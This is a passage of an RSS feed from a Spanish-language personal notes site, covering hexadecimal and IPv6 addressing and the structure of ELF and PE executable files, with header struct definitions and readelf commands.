 <br><br>Para comprender el direccionamiento de IPv4 de nuestra red, es fundamental entender cómo convertir de binario a decimal y vicebersa (Explcado en <a data-href="Binary and Decimal Systems &amp; IPv4 Directions" href="https://dobliuw.com/notes/2.-networks/network-basics/binary-and-decimal-systems-&amp;-ipv4-directions.html" class="internal-link" target="_self" rel="noopener nofollow">Binary and Decimal Systems &amp; IPv4 Directions</a>). Pero actualmente se comienza a visualizar con mayor frecuencia las direcciones IPv6 en nuestras redes. Para entender estas direcciones, debemos ser capaces de convertir hexadecimal a decimal y viceversa.<br>Así como el decimal es un sistema de base 10, el hexadecimal es un sistema de base 16. El  sistema base 16 consta los dígitos del 0 al 9 y las letras de la A a la F. (Esto se encuentra explicado en mayor detalle en <a data-href="1. Hexadecimal" href="https://dobliuw.com/notes/0.-needed-concepts/systems/1.-hexadecimal.html" class="internal-link" target="_self" rel="noopener nofollow">1. Hexadecimal</a>). <br>A continuación la imagén muestra los valores decimales y hexadecimales equivalentes para los binarios desde el 0000 al 1111:<br><img alt="decimal_binary_hexadecimal_table_example_image.png" src="https://dobliuw.com/lib/media/decimal_binary_hexadecimal_table_example_image.png"><br>Binario y hexadecimal funcionan bien juntos porque es más fácil expresar un valor como un solo dígito hexadecimal qeu como cuatro bits binarios. <br>El sistema de numeración hexadecimal se usa en redes para representar Direcciones IPv6 y Direcciones MAC Ethernet.<br>Las direcciones IPv6 tienen una lontigud de 128 bits y cada 4 bits está representado por un sólo dígito hexadecimal; para un total de 32 valores hexadecimales. Las direcciones IPv6 no distinguen entre mayúsculas y minúsculas, y pueden escribirse de igual manera en ambas maneras.<br>Como se muestra en la siguiente imagen, el format preferido para escribir una dirección IPv6 es x:x:x:x:x:x:x:x:, donde cada x consta de cuatro valores hexadecimales. Al hacer referencia a 8 bits de una dirección IPv4, utilizamos el término "octeto". En IPv6, un "hexteto" es el término no oficial que se utiliza para referirise a un segmento de 16 bits o cuatro valores hexadecimales. Cada "x" es un único hexteto, 16 bits o cuatro dígitos hexadecimales.<br><img alt="ipv6_with_hextets_and_binary_example_image.png" src="https://dobliuw.com/lib/media/ipv6_with_hextets_and_binary_example_image.png"><br>Un ejemplo de topología de direcciones hexadecimales IPv6 es la siguiente topología:<br><img alt="ipv6_addresses_topology_hexadecimal_example_image.png" src="https://dobliuw.com/lib/media/ipv6_addresses_topology_hexadecimal_example_image.png"><br><br><br>La conversión de números decimales a valores hexadecimales es bastante sensilla.<br>
<br>Convertir el número decimal a cadenas binarios de 8 bits.
<br>Dividir las cadenas binarias engrupos de cuatro comenzando desde la posición más a la derecha.
<br>Convertir cada cuatro números binarios en un digito hexadecimal
<br>Ejemplo: 168 a Hexadecimal<br>
<br>168 = 10101000
<br>1010 y 1000
<br>1010 = A y 1000 = 8
<br>Es decir que el número 168 tiene el valor hexadecimal de A8.<br><br><br>En este caso, el proceso inverso también es sensillo.<br>
<br>Convertir el número hexadecimal en cadenas binarias de 4 bits.
<br>Crear un a agrupación binarioa de 8 bits comenzado desde la posición más a la derecha.
<br>Convertir cada agrupación binaria de 8 bits en su dígito decimal equivalente.
<br>Ejemplo: D2 a Decimal<br>
<br>D = 1101 = y 2 = 0010
<br>11010010
<br>11010010 = 210
<br>Es decir que el valor hexadecimal de D2 tiene el valor decimal de 210.<br>Los procesos aplicados pueden ser encontrados en <a data-href="Binary and Decimal Systems &amp; IPv4 Directions" href="https://dobliuw.com/notes/2.-networks/network-basics/binary-and-decimal-systems-&amp;-ipv4-directions.html" class="internal-link" target="_self" rel="noopener nofollow">Binary and Decimal Systems &amp; IPv4 Directions</a>.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/hexadecimal-systems-&amp;-ipv6-mac.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/Hexadecimal Systems &amp; IPv6 - MAC.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 03 Oct 2024 15:41:04 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/decimal_binary_hexadecimal_table_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/decimal_binary_hexadecimal_table_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[ELF_Format.draw]]></title><description><![CDATA[ 
 
  
  
  
    
  
  Executable and Linkable          FormatELF HeaderSection Header     TableSection 1Program Header Table...Section 2Section NSegmentsSections]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/linux-unix/graficos/elf_format.draw.html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Executable Formats/Linux - Unix/Graficos/ELF_Format.draw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 15:03:11 GMT</pubDate></item><item><title><![CDATA[Executable and Linkable Format - Formato ELF]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:sistemas" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#sistemas</a> <a class="tag" href="https://dobliuw.com/?query=tag:ejecutables" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ejecutables</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:sistemas" class="tag" target="_blank" rel="noopener nofollow">#sistemas</a> <a href="https://dobliuw.com?query=tag:ejecutables" class="tag" target="_blank" rel="noopener nofollow">#ejecutables</a>
<br><br><br>El formato ELF (Executable and Linkable Format) es un estándar amplicamente utilizado en sistemas operativos Unix y Linux para representar archivos ejecutables, bibliotecas compartidas y objetos compilados. Fue diseñado para ser un formato versátil y extensible que permite a los desarrolladores crear y distribuir software de manera eficiente y portátil.<br><br><br>Un archivo ELF consiste en una serie de encabezados y secciones que indican al sistema operativo cómo cargar y administrar el archivo en memoria. Recordemos que un archivo ELF se utiliza para proporcionar información esencial al sistema operativo sobre cómo organizar y ejecutar el cotenido del archivo. La información que el sistema necesita puede incluir:<br>
<br>Referencias a bibliotecas compartidas que deben ser cargadas.
<br>Tablas de símbolos para resolución de símbolos.
<br>Segmentos y secciones que especifican cómo se debe cargar el archivo en memoria. (El sistema operativo mapeará el archivo en memoria en partes, no en su totalidad).
<br>Es importante tener en cuenta que además, la estructura de un archivo ELF puede variar ya que dependiendo de si es un ejecutable, un objeto, una biblioteca compartida, etc. puede ser que el Program Header Table este previo el Section Header Table, esto de igual manera estara declarado en el ELF Header, donde el campo e_phoff (Program Header Table Offset) indicará la ubicación del inicio del Program Header Table así como el camp e_shoff (Section Header Table Offset) que inidicará la ubicación del inicio del Section Header Table. Teniendo en cuenta esto, la estructura del archivo ELF es la siguiente:<br>Imagén capturada de <a data-href="ELF_Format.draw" href="https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/linux-unix/graficos/elf_format.draw.html" class="internal-link" target="_self" rel="noopener nofollow">ELF_Format.draw</a><br>
<img alt="ELF_Format.png" src="https://dobliuw.com/lib/media/elf_format.png"><br><br><br>Este es el Header principal de un archivo ELF. Contiene información fundamental, como el tipo de archvo (Ejecutable, objeto, biblioteca compartida, etc.), la arquitectura del procesador, la versión del formato, el punto de entrada y otros datos esenciales.<br>Definición de ELF Header en 32 bits:<br>#include &lt;elf.h&gt;
#define EI_NIDENT (16)
 
typedef struct
{
  unsigned char e_ident[EI_NIDENT]; /* Número mágico y otros datos */
  Elf32_Half e_type; /* Tipo de fichero (ejecutable, biblio...) */
  Elf32_Half e_machine; /* Arquitectura */
  Elf32_Word e_version; /* Versión */
  Elf32_Addr e_entry; /* Punto de entrada */
  Elf32_Off e_phoff; /* Desplazamiento a la tabla de cabeceras de programa */
  Elf32_Off e_shoff; /* Desplazamiento a la tabla de cabeceras de sección */
  Elf32_Word e_flags; /* Flags específicos del procesador */
  Elf32_Half e_ehsize; /* Tamaño de la cabecera ELF */
  Elf32_Half e_phentsize; /* Tamaño de las cabeceras de programa */
  Elf32_Half e_phnum; /* Número de cabeceras de programa */
  Elf32_Half e_shentsize; /* Tamaño de las cabeceras de sección */
  Elf32_Half e_shnum; /* Número de cabeceras de sección */
  Elf32_Half e_shstrndx; /* Cabecera de sección que apunta a los nombres del resto de cabeceras */
} Elf32_Ehdr;
Copy<br>El comando readelf es una herramienta de línea de comandos que se utiliza para examinar y mostrar información detallada sobre archivos en formato ELF. <br>Podemos visualizar el ELF Header haciendo uso del comando:<br>readelf -h {ELF_file}
Copy<br>Ejemplo: <br><img alt="readelf_elf_header.png" src="https://dobliuw.com/lib/media/readelf_elf_header.png"><br><br><br>Esta es una tabla que consta de entradas de tipo Elf32_Phdr o Elf64_Phdr, donde cada entrada describe un segmento de programa específico dentro del archivo ELF. Cuando nos referimos a describir un segmento de programa nos referimos a proporcionar información sobre cómo se debe cargar y gestionar una parte específica del programa en la memoria durante su ejecución.<br>Esta tabla esta presente solo en archivos ejecutables y es una parte esencial de los archivos ELF, describe las segmentaciones de programa contenidas en el archiovo. A diferencia de los Section Headers que se utilizan para describir las secciones individuales del archivo (Como código, datos, etc.) los Program Headers se utilizan para describir segmentos de memoria que se cargan en la memoria durante la ejecución del programa. Estos segmentes pueden contener código ejecutable, datos, bibliotecas compartidas y otros recursos.<br>Para correr un programa, el Kernel cargar el ELF Header y el Program Header Table en memoria. Luego, carga el contenido especificado en el apatado LOAD de esta encabezado en memoria y también revisa si el intérprete es necesitado. Por último, se le da el control al propio ejecutable o al intérprete si está disponible. <br>Definición de cada elemento Program Header en 32 bits, empiezan en el offset e_phoff del ELF Header y es un array con e_phnum de estos elementos:<br>typedef struct {  
	uint32_t p_type;    /* Tipo de segmento */
	Elf32_Off p_offset; /* Desplazamiento dentro del archivo a partir del cual empieza */  
	Elf32_Addr p_vaddr; /* Dirección virtual donde el segmento debe cargarse */   
	Elf32_Addr p_paddr; /* Dirección física de carga, esto no es usado en la mayoría de sistemas */   
	uint32_t p_filesz;  /* Tamaño del segmento en el fichero, es el número de bytes que físicamente ocupa dentro del ELF */  
	uint32_t p_memsz;   /* Tamaño en memoria, cuando es mayor que el tamaño anterior, los bytes extra se suelen rellenar con ceros */  
	uint32_t p_flags;   /* Flags, indicando si el segmento se puede leer, escribir y/o ejecutar */
	uint32_t p_align;   /* Alineamiento, debe ser potencia de dos */   
} Elf32_Phdr;
Copy<br>Para listar la Program Header Table de un archivo ELF, podemos utilizar el siguiente comando:<br>readelf -l {ELF_file}
Copy<br>Ejemplo: <br><img alt="readelf_program_table.png" src="https://dobliuw.com/lib/media/readelf_program_table.png"><br><br><br>Luego del Program Header Table, vienen las secciones del archivo ELF. Las secciones son áreas lógicas dentro del archivo qeu contiene código, datos, símbolos, tablas de reubicación, información de depuración y otros tipos de datos. Cada sección tiene un propósito específico en el programa.<br>Algunas de las secciones habituales más importantes que existe en la mayoría de archivos ELF son:<br>
<br>.text: Esta sección contiene el código ejecutable del programa. Es donde reside el código fuente compilado y se ejecuta cuando se inicia el programa. En esta sección se encuentra la lógica principal.
<br>.data: Esta sección almacena datos inicializados que el programa utiliza durante su ejecución. Esto puede incluir variables globales y datos estáticos que tienen un valor específico en el momento de la compilación.
<br>.rodata: Similar a la sección .rdata en el <a data-href="Portable Executable - Formato PE" href="https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/windows/portable-executable-formato-pe.html" class="internal-link" target="_self" rel="noopener nofollow">Portable Executable - Formato PE</a>, esta sección (Read-only data) almacena datos qeu son de solo lectura durante la ejecución. Estos datso suelen incluir cadenas constantes y otros valores que no deben modificarse.
<br>.plt y .got: Estas secciones están relacionadas con la resolución de símbolos y la vinculación dinámica. .plt (Procedure Linkage Table) contiene saltos de código que se utilizan para la resolución de símbolos en tiempo de ejecución, mientras que .got (Gloabl Offset Table) contiene punteros a funciones y variables globales que se resuelven en tiempo de ejecución.
<br>.rel[a].text y .rel[a].data: Estas secciones, como .reloc en PE, almacenan información de reubicación. Indican al enlazador dinámico cómo ajustar las direcciones de memoria de las secciones .text y .data para que el programa se pueda cargar en memoria correctamente.
<br>.bss: Aunque no aparece explícitamente en la Section Table la sección .bss es una sección común en ELF que almacena datos no inicializados. Esta sección no ocupa espacio en el archivoo, pero se reserva espacio en memroia para datos no inicializados como variables globales no inicializadas.
<br>Definición de cada Section en 32 bits, empieza en e_shoff del ELF Header y contiene una cantidad determinada de secciónes declaradas en e_shnum:<br>typedef struct {    
	Elf32_Word sh_name;      /* Nombre de sección (es un desplazamiento dentro de un array de caracteres) */ 
	Elf32_Word sh_type;      /* Tipo de sección */   
	Elf32_Word sh_flags;     /* Flags */  
	Elf32_Addr sh_addr;      /* Dirección virtual, si es que la sección forma parte de un segmento que se carga en memoria */ 
	Elf32_Off sh_offset;     /* Desplazamiento dentro del fichero */  
	Elf32_Word sh_size;      /* Tamaño en bytes */   
	Elf32_Word sh_link;      /* Índice de otra sección asociada, que quizá haga falta para procesar el contenido de esta */  
	Elf32_Word sh_info;      /* Información extra */   
	Elf32_Word sh_addralign; /* Alineamiento, debe ser potencia de dos */  
	Elf32_Word sh_entsize;   /* Tamaño de la entrada si la sección se refiere a una tabla */   
} Elf32_Shdr;
Copy<br>Para listar las secciones de un archivo ELF podemos hacer uso del comando:<br>readelf -S {ELF_binary}
Copy<br>Ejemplo:<br><img alt="readelf_section_table.png" src="https://dobliuw.com/lib/media/readelf_section_table.png"><br><br><br>La Tabla de Secciones o Section Header Table es una parte fundamental del formato ELF. Contiene entradas de tipo Elf32_Shdr o Elf64_Shdr (Sction Header) que describen cada una de las secciones en el archivo, como nombres, tipos, tamaños, offsets y otros metadatos.<br>La información es usada durante el tiempo de enlace dinámico, justo antes de que el programa sea ejecutado. Los linkers enlazan el archivo con las bibliotecas compartidas que necesita para cargarlas en memoria. También esta sección contiene información que es usada por otros archivos para encontrar las definiciones simbolicas y referencias al programa.<br>La principal diferencia con el Program Header es que este se enfoca en describir cómo se debn cargar los segmentos de programa en la memoria durante la ejecución, mientras que los Section Header se enfocan en proporcionar información detallada sobre las secciones individuales del archivo ELF.<br>Para listar la Section Header Table de un binario podemos ejecutar el comando:<br>readelf -S {ELF_file}
Copy<br>Ejemplo:<br><img alt="readelf_section_table.png" src="https://dobliuw.com/lib/media/readelf_section_table.png">]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/linux-unix/executable-and-linkable-format-formato-elf.html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Executable Formats/Linux - Unix/Executable and Linkable Format - Formato ELF.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:25 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/elf_format.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/elf_format.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[PE_Format.draw]]></title><description><![CDATA[ 
 
  
  
  
    
  
  PE FormatDOS HeaderDOS StubNT HeadersPE SignatureData DirectoriesData Directory Import [0]...Data Directory Export [1]Optional HeaderFile HeaderSection HeaderSection 1 InfoSection 2 InfoSection N Info...SectionsSection 1 (.text)Section 2 (.data)Section N ...]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/windows/graficos/pe_format.draw.html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Executable Formats/Windows/Graficos/PE_Format.draw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 15:03:11 GMT</pubDate></item><item><title><![CDATA[Portable Executable - Formato PE]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:sistemas" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#sistemas</a> <a class="tag" href="https://dobliuw.com/?query=tag:ejecutables" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#ejecutables</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:sistemas" class="tag" target="_blank" rel="noopener nofollow">#sistemas</a> <a href="https://dobliuw.com?query=tag:ejecutables" class="tag" target="_blank" rel="noopener nofollow">#ejecutables</a>
<br><br><br>PE proviene de Portable Executable, el cual es un formato de archivo para ejecutables utilizados en los sistemas operativos Windows, se basa en el formato de archivo COFF (Common Object File Format).<br>No solo los arhciovs .exe son archivos PE, las bibliotecas de enlaces dinámicos (.dll), los módulos del kernel (.srv), las aplicaciones del panel de control (.cpl) y muchos otros también son archivos PE. Un archivo PE es una estructura de datos que contiene la información necesaria para que el cargador del sistema operativo pueda cargar ese ejecutable en la memoria y ejecutarlo.<br><br><br>Un archivo PE consiste de una serie de headers y secciones que indican al enlazador dinámico <a data-footref="1" href="https://dobliuw.com/#fn-1-deedc4a96e077d7b" class="footnote-link" target="_self" rel="noopener nofollow">[1]</a> cómo asignar el archivo en memoria.<br>
Recordemos que un archivo de formato PE sirve para decirle a enlazadores dinámicos qué información necesitan para administrar el código ejecutable empaquetado. La información que requiere el sistema se puede mencionar como:<br>
<br>Referencias a DLLs a importar.
<br>Importar/Exportar tablas de API.
<br>Cuánto espacio de memoria reservar. (En la memoria irán el código, los datos y los recursos que necesitará el proceso en el sistema. El PE nunca se mapea entero, solo por partes).
<br>Teniendo en cuenta esto, la estructura de esta información se puede encontrar de la siguiente manera:<br>Imagén de capturada del <a data-href="PE_Format.draw" href="https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/windows/graficos/pe_format.draw.html" class="internal-link" target="_self" rel="noopener nofollow">PE_Format.draw</a>.<br>
<img alt="PE_Format.png" src="https://dobliuw.com/lib/media/pe_format.png"><br><br><br>Cada arachivo PE comienza con una estructura de 64 bytes de largo llamada DOS Header, es lo que hace que el archivo PE sea un ejecutable de MS-DOS.<br>IMAGE<a data-footref="3" href="https://dobliuw.com/#fn-3-deedc4a96e077d7b" class="footnote-link" target="_self" rel="noopener nofollow">[3]</a> del DOS Header<br>typedef struct _IMAGE_DOS_HEADER { 
0x00 WORD e_magic; 
0x02 WORD e_cblp; 
0x04 WORD e_cp;
0x06 WORD e_crlc; 
0x08 WORD e_cparhdr; 
0x0a WORD e_minalloc; 
0x0c WORD e_maxalloc; 
0x0e WORD e_ss; 
0x10 WORD e_sp; 
0x12 WORD e_csum;
0x14 WORD e_ip;
0x16 WORD e_cs;
0x18 WORD e_lfarlc; 
0x1a WORD e_ovno; 
0x1c WORD e_res[4];
0x24 WORD e_oemid; 
0x26 WORD e_oeminfo;
0x28 WORD e_res2[10];
0x3c DWORD e_lfanew; 
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
Copy<br>Los miembros más importantes de esta estructura son e_magic y e_lfanew.  Siendo el e_magic 2 bytes con el valor 0x5A4D (MZ) y e_lfanew un valor de 4 bytes que contiene el offset hasta el inicio del NT Header (Siempre e_lfanew se encuentra en el offset 0x3C).<br><br><br>El código auxiliar de DOS, es un pequeño ejecutable compatible con MS-DOS 2.0 que simplemente imrpime un mensaje de error que dice This Program Cannot Run in DOS Mode y suele ocupar 57 bytes.<br><br><br>Parte fundamental de la estructura de los archivos PE. Este encabezado proporciona información esencial sobre la organización y el contenido del archivo ejecutable, lo que permite al sistema operativo y a otros programas comprender cómo cargar y ejecutar el archivo de manera adecuada. <br>IMAGE del NT Headers x86<br>typedef struct _IMAGE_NT_HEADERS { 
0x00 DWORD Signature;
0x04 _IMAGE_FILE_HEADER FileHeader; 
0x18 _IMAGE_OPTIONAL_HEADER32 OptionalHeader; 
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
Copy<br>IMAGE del NT Headers x64<br>typedef struct _IMAGE_NT_HEADERS { 
0x00 DWORD Signature;
0x04 _IMAGE_FILE_HEADER FileHeader; 
0x18 _IMAGE_OPTIONAL_HEADER64 OptionalHeader; 
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS54;
Copy<br>Este Header es esencial ya que incorpora otros dos Headers que son estructuras de datos (FileHeader y OptionalHeader).<br><br>Header de archivo COFF estándar. Contiene información sobre el archivo PE.<br>IMAGE del File Header<br>typedef struct _IMAGE_FILE_HEADER { 
0x00 WORD Machine;
0x02 WORD NumberOfSections;
0x04 DWORD TimeDateStamp;
0x08 DWORD PointerToSymbolTable; 
0x0c DWORD NumberOfSymbols;
0x10 WORD SizeOfOptionalHeader;
0x12 WORD Characteristics; 
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
Copy<br>Los miembros más importantes de esta estructura son:<br>
<br>NumberOfSections: El number de secciones en el archivo PE.
<br>Characteristics: Flags que especifican ciertos atributos sobre el archivo ejecutable, como si es una DLL o una aplicación de consola.
<br>SizeOfOptinalHeader: El tamaño del siguiente Optional Header
<br><br>El Header más importante en los NT Headers, su nombre es Optional Header porque algunos archivos, como los archivos objeto, no lo tienen, es necesario para los archivos de imagen (Archivos como .exe). Este encabezado proporciona información importante al cargador del sistema operativo.<br>IMAGE del Optional Header<br>typedef struct _IMAGE_OPTIONAL_HEADER { 
0x00 WORD Magic; 
0x02 BYTE MajorLinkerVersion; 
0x03 BYTE MinorLinkerVersion;
0x04 DWORD SizeOfCode; 
0x08 DWORD SizeOfInitializedData;
0x0c DWORD SizeOfUninitializedData;
0x10 DWORD AddressOfEntryPoint; 
0x14 DWORD BaseOfCode; 
0x18 DWORD BaseOfData; 
0x1c DWORD ImageBase; 
0x20 DWORD SectionAlignment;
0x24 DWORD FileAlignment;
0x28 WORD MajorOperatingSystemVersion; 
0x2a WORD MinorOperatingSystemVersion;
0x2c WORD MajorImageVersion; 
0x2e WORD MinorImageVersion; 
0x30 WORD MajorSubsystemVersion; 
0x32 WORD MinorSubsystemVersion;
0x34 DWORD Win32VersionValue;
0x38 DWORD SizeOfImage; 
0x3c DWORD SizeOfHeaders; 
0x40 DWORD CheckSum; 
0x44 WORD Subsystem; 
0x46 WORD DllCharacteristics;
0x48 DWORD SizeOfStackReserve;
0x4c DWORD SizeOfStackCommit;
0x50 DWORD SizeOfHeapReserve;
0x54 DWORD SizeOfHeapCommit; 
0x58 DWORD LoaderFlags;
0x5c DWORD NumberOfRvaAndSizes;
0x60 _IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  // IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16
};
Copy<br><br><br>Este apartado se encuentra dentro del Optional Header, y las entradas de este Array de un total de IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16 posiciones apunta a diferentes tablas y estrucutas de datos importantes que se almacenan en secciones específicas del archivo PE. <br>Cada posición del array representa un Data Directory especifico que puede incluir algo de data de la PE Section o Data Table.<br>IMAGE de cada Data Directory<br>typedef struct _IMAGE_DATA_DIRECTORY { 
0x00 DWORD VirtualAddress; 
0x04 DWORD Size; 
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
Copy<br>Indices del Array<br>define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory
define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor
Copy<br>Dos Data Directories importanes son el de la posición 0 y 12, es decir Export Directory y Import Address Table. <br><br>El Export Directory de un archivo de formato PE es una estructura de datos que contiene información sobre funciones y variables exportadas desde el ejecutable. Contiene direcciones de las funciones y variables exportadas, las cuales puede ser usadas por otros archivos ejecutables para acceder a las funciones o datos.<br>
El Export Directory es generalmente encontrado en DLLs que exportan funciones, por ejemplo kernel32.dll exportando CreateFileA.<br><br>El Import Address Table es una estructura de datos que contiene información sobre direcciones o funciones importadas desde otro archivo ejecutable. Las direcciones son usadas para acceder a funciones y datos alojados en otros ejecutables, por ejemplo Aplication.exe importa CreateFileA desde kernel32.dll. <br><br><br>Inmediatamente seguido al Optional Header esta la Section Table, es un array de Headers para cada sección en el archivo PE. Cada Header contiene información sobre la sección a la que hace referencia.<br>IMAGE de cada Header Section<br>typedef struct _IMAGE_SECTION_HEADER { 
0x00 BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; 
	union { 
0x08 DWORD PhysicalAddress; 
0x08 DWORD VirtualSize; 
	} Misc; 
0x0c DWORD VirtualAddress; 
0x10 DWORD SizeOfRawData; 
0x14 DWORD PointerToRawData; 
0x18 DWORD PointerToRelocations;
0x1c DWORD PointerToLinenumbers;
0x20 WORD NumberOfRelocations; 
0x22 WORD NumberOfLinenumbers; 
0x24 DWORD Characteristics; 
};
Copy<br>Algunos de los elementos más importantes son<br>
<br>Name: El nombre de la sección, por ejemplo .text, .data, etc.
<br>PhysicalAddress o VirtualSize: El tamaño de la sección cuando esta en memoria.
<br>VirtualAddress: Offset de donde empieza la sección en memoria. 
<br><br><br>Las secciones son una parte fundamental de la estructura del archivo PE. Las secciones son divisiones lógicas dentro de un archivo PE que almacenan datos específicos relacionados con el programa o la biblioteca. Cada sección tiene un propósito particular y contiene información relevante para la carga y ejecución del programa.<br>Estas secciones contienen código y datos usados para crear un archivo ejecutable. Cada sección recibe un nombre único y mayormente contiene el código del ejecutable, datos o información de recursos. No existe un número constante de secciones ya que un compilador puede agregar, remover o mergear secciones dependiendo de la configuración. Algunas secciones también pueden ser agregadas más tarde de manera manual, por lo tanto son dinamicas y el campo IMAGE_FILE_HEADER.NumberOfSections ayuda a determinar la cantidad de secciones que existen.<br>Algunas de las secciones habituales más importantes que existe en la mayoría de arhicvos PE son:<br>
<br>.text: Contiene el código del ejecutable, es decir, el código que fue escrito.
<br>.data: Contiene los datos inicializados, es decir, las variables inicializadas en el código.
<br>.rdata: Contiene únicamente la data read-only, es decir, las variables constant declaradas con el prefijo const. 
<br>.idata: Contiene las Import Tables. Estas son tablas de información relacionada a funciones llamadas durante el código. Esto es usado por el cargador de Windows (PE Windows Loader) que determina que DLL's serán cargadas al proceso, así como que funciones comenzaran a ser usadas de cada DLL. 
<br>.reloc: Contiene información sobre cómo arreglar las direcciones de memoria para que los programas puedan cargarse en la memoria sin errores.
<br>.rsrc: Usado para restaurar recursos como iconos y bitmaps.
<br><br><br><br><br><br>
<br>
<br>Dynamic Linker/Enlazador Dinámico: Parte esencial del sistema operativo que se encarga de resolver y cinvular referencias a DLL en tiempo de ejecución cuando un porgrma se carga en memoria.<a href="https://dobliuw.com/#fnref-1-deedc4a96e077d7b" class="footnote-backref footnote-link" target="_self" rel="noopener nofollow">↩︎</a>
<br>DOS: Término utilizado para referirse a Disk Operative System, sistema operativo que se utiliza para gestionar y controlar el acceso a dispositivos de almacenamiento, como discos duros, unidades de disquete y unidades de CD/DVD en un equipo. Dos sistemas operativos conocidos con el nombre DOS son MS-DOS y PC-DOS. <a href="https://dobliuw.com/#fnref-2-deedc4a96e077d7b" class="footnote-backref footnote-link" target="_self" rel="noopener nofollow">↩︎</a>
<br>IMAGE: En el contexto de arhcivos PE, IMAGE se utiliza en las estructuras de datos y encabezados en archivos PE para indicar que están relacionados con la implementación interna del formato PE y son parte del formato de archivo.<a href="https://dobliuw.com/#fnref-3-deedc4a96e077d7b" class="footnote-backref footnote-link" target="_self" rel="noopener nofollow">↩︎</a>
]]></description><link>https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/windows/portable-executable-formato-pe.html</link><guid isPermaLink="false">Notes/3. System/Global Concepts/Executable Formats/Windows/Portable Executable - Formato PE.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 07 Dec 2023 22:28:05 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pe_format.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pe_format.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[CPU]]></title><description><![CDATA[ 
